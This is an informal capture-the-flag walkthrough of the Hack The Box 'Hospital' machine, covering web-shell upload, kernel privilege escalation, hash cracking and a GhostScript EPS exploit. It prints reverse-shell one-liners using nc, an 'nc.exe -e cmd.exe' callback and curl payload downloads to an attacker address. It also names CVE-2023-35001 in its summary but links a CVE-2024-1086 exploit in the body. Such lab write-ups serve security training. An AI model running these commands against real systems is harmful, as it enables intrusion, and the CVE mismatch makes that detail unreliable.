
https://www.hackthebox.com/achievement/machine/1777380/576

### **Hospital - HTB Machine Wa
lkthrough 

**Target:** Windows Active Directory environment with a web server and `RoundCube` email service.

---

### **1. Web Application Exploitation (Initial Access)**

- The target hosts a **web server** with a **file upload vulnerability**.
- Uploading a **malicious PHP file** allows **remote code execution** (RCE).
- A **reverse shell** is established on the **Linux vm !1** hosting the web service.

---

### **2. Privilege Escalation to Root (Linux)**

- The Linux machine runs an **outdated kernel** vulnerable to **CVE-2023-35001**.
- Exploiting this vulnerability grants **root privileges**.
- With **root access**, we can read **/etc/shadow**, extract password hashes, and **crack them**.

---

### **3. Compromising `RoundCube` Email (Credential Discovery)**

- The cracked credentials are used to log in to the **RoundCube email service**.
- Emails reveal that **GhostScript** is used on the system.

---

### **4. Exploiting GhostScript (Windows RCE)**

- **GhostScript** is vulnerable to **CVE-2023-36664**, allowing arbitrary code execution.
- A **malicious Embedded PostScript (EPS) file** is crafted and uploaded.
- Exploiting this vulnerability provides **remote code execution (RCE) on the Windows host**.

---

### **5. Privilege Escalation on Windows (Two Paths)**

1. **Keylogger Attack**
    - A keylogger captures **administrator credentials**, allowing full system control.
2. **Abusing XAMPP Misconfigurations**
    - XAMPP is **misconfigured**, allowing privilege escalation to **SYSTEM**.

---

### **Conclusion**

- **Step 1:** Exploit file upload to gain RCE on Linux.
- **Step 2:** Exploit **CVE-2023-35001** for **root privileges** on Linux.
- **Step 3:** Crack `/etc/shadow` hashes to retrieve RoundCube credentials.
- **Step 4:** Exploit **GhostScript (CVE-2023-36664)** to get RCE on Windows.
- **Step 5:** Escalate to SYSTEM using either **keylogging** or **XAMPP misconfigurations**.


---

## Enumeration
-`ip`= 10.10.11.241
-hospital.htb


```bash
┌──(pwn㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- 10.10.11.241 

```
-what device hold the ip  10.10.11.241 ?
-/etc/hosts add the ip + dns hospital.htb + DC.hospital.htb
-ping it , DONE
```
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28) 

how?
it is possible to run Apache HTTP Server** and PHP on Windows 64-bit (Win64). This is commonly done using XAMPP, WampServer, or manual installation of Apache and PHP.


```
- `/phpmyadmin/` on xampp
-**XAMPP** is a free and open-source software stack used to set up a local web server environment on **Windows, Linux, and macOS**. It includes:
✅ **X** – Cross-platform (Runs on Windows, Linux, macOS)  
✅ **A** – Apache (Web Server)  
✅ **M** – MySQL/MariaDB (Database)  
✅ **P** – PHP (Scripting Language)  
✅ **P** – Perl (Scripting Language)

-3389/tcp remote desktop open
-8080 http + ubuntu !!
```bash
┌──(pwn㉿kali)-[~]
└─$ ping DC.hospital.htb
PING hospital.htb (10.10.11.241) 56(84) bytes of data.
64 bytes from hospital.htb (10.10.11.241): icmp_seq=1 ttl=127 time=76.1 ms

its windows !! ttl=128 windows default

```
-http://10.10.11.241:8080/register.php , found
- login 
-http://10.10.11.241:8080/index.php 
-![[Pasted image 20250204154723.png]]-upload ?/
-http://10.10.11.241:8080/uploads/ , exists but forbidden
-http://10.10.11.241:8080/uploads/whateveryouupladed.png <> check
	-it must appears
-![[1_F660tQgQUXVX2i7ydWeHwg.webp]]- i take a lock for hints and got :
  - .phar will worrk
- https://github.com/flozz/p0wny-shell?source=post_page-----ccd5eddaa9a8--------------------------------
```
http://10.10.11.241:8080/uploads/shell.phar

will run as web shell lets get interactive revesre shell vie
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.5 9996 > /tmp/f

```

---

## pre exploitation

![[Pasted image 20250204161854.png]]
 -looking for databases
```bash
www-data@webserver:/var/www/html$ cat config.php
-------------------------------------------------------------
cat config.php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
-------------------------------------------------------------
www-data@webserver:/var/www/html$ 
```

```bash
mysql -u root -p

```
-mysql commands to see users table
```
admin
$2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 
patient  $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO
ahmad    $2y$10$zV8Pt73748Ts0k3G2dUnL.IAvXL4slW5C5BfWLzQJ.6Ljfoh8YlwW 

```

```
$2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2:123456
```

```
uname u
www-data@webserver:/tmp$ uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

```

```bash
this is kernal
5.19.0-35-generic , search in google for any cve !!!

```

```

https://github.com/Notselwyn/CVE-2024-1086/releases/tag/v1.0.0

```

transfer it 
-chmod +x exploit
-./exploit
![[Pasted image 20250204171757.png]]

-cat /etc/shadow
```
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::


root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::

```

-william crack ?
```bash
$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#
qwe123!@#


┌──(pwn㉿kali)-[~]
└─$ netexec smb 10.10.11.241 -u drwilliams -p 'qwe123!@#'
┌──(pwn㉿kali)-[~]
└─$ netexec smb 10.10.11.241 -u drwilliams -p 'qwe123!@#' --shares          -----------     ------
SMB         10.10.11.241    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.241    445    DC               C$                              Default share
SMB         10.10.11.241    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.241    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.241    445    DC               SYSVOL          READ            Logon server share 

```

```bash
https://10.10.11.241/
try admin 123456
Login failed.

try drwilliams  qwe123!@#
- boom!

```

![[Pasted image 20250204174311.png]]
-Webmail RoundCube

---
Roundcube Webmail 1.6.4
Copyright © 2005-2022, The Roundcube Dev Team
This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.

---
-Chris Brown found 
Dear Lucy,
design in an ".eps" file format so that it can be well
visualized with GhostScript.



---
### **Malicious .EPS File (Encapsulated PostScript Exploit)**

- `.EPS` files can contain **embedded scripts** that exploit vulnerabilities in **GhostScript**, a popular tool used to render `.eps` and `.ps` files.
- If the recipient opens the `.eps` file, it **could execute arbitrary code**, potentially allowing an attacker to gain control over their system.
- GhostScript has a history of **critical vulnerabilities** (e.g., CVE-2019-6116) that allow **remote code execution (RCE)** if exploited properly.

Attackers often use `.eps` files in **spear-phishing attacks** against designers, journalists, and companies using Adobe or GhostScript-based software.

GhostScript is an interpreter for **PostScript** and **PDF** files. It is commonly used for:

1. **Rendering PDFs & PostScript files** – GhostScript converts these formats into images or other printable formats.
2. **Manipulating PDFs** – It can merge, split, and modify PDFs.
3. **Converting file formats** – It can convert PostScript files (`.ps`) to PDFs and vice versa.
---
-search ghostscript eps exploit
https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
---
```bash
host web python server + nc listner
┌──(pwn㉿kali)-[~]
└─$ python3 CVE_2023_36664_exploit.py -g -x eps -f file2 -p "curl http://10.10.14.5/ncat.exe -o nc.exe"
reply it in the email 
┌──(pwn㉿kali)-[~]
└─$ python3 CVE_2023_36664_exploit.py -g -x eps -f file3 -p "nc.exe -e cmd.exe 10.10.14.5 1337" 

[+] Generated EPS payload file: file3.eps

```

## post-exploitation
![[Pasted image 20250204194722.png]]

remember10/22/2023  09:10 PM   xampp
By exploiting the permissions associated with the "drbrown" user, an attacker could potentially upload a malicious PHP file into the web server’s root directory (C:\xampp\htdocs). This vulnerability is particularly severe because the web server is running under the NT AUTHORITY\SYSTEM account, which possesses full administrative rights on the Windows system. This elevated privilege allows the attacker to execute the uploaded malicious file with system-level access.



---

```cmd
C:\xampp>cd htdocs
```
- https://github.com/flozz/p0wny-shell/blob/master/shell.php
- ITS WEB BASED SHELL
in my pwn-BOX
```bash
┌──(pwn㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.241 - - [04/Feb/2025 11:59:08] "GET /shell.php HTTP/1.1" 200 -


```

target:
```cmd
curl http://10.10.14.5/shell.php -o powny.php
```

![[Pasted image 20250204200112.png]]